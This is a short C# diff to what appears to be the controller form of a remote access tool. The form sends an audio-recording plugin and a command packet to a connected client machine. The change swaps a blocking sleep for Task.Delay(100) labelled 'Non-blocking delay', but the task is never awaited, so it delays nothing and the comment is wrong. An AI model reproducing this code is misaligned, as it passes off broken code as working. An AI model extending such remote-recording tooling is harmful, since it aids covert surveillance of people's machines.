@@ -44,9 +44,12 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Audio.dll"));
                 msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                Thread.Sleep(100);
+                
                 btnStartStopRecord.Text = "Wait...";
-                btnStartStopRecord.Enabled = false;                
+                btnStartStopRecord.Enabled = false;
+                
+                // Non-blocking delay
+                System.Threading.Tasks.Task.Delay(100);                
             }
             else
             {
